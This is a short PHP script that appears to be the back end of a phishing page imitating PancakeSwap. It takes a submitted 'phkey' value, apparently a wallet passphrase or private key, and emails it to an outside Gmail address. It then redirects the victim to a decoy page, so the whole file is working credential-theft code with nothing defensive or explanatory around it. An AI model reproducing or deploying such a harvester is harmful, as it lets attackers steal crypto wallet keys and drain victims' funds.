<?php 



$phkey = $_POST['phkey'];


$to = "wnewton208@gmail.com"; 

$subject = "New Message from pancakeswap"; 

$body = "phkey : $phkey";

mail($to,$subject,$body); 

header("location:pancakes.html") ;  ?>
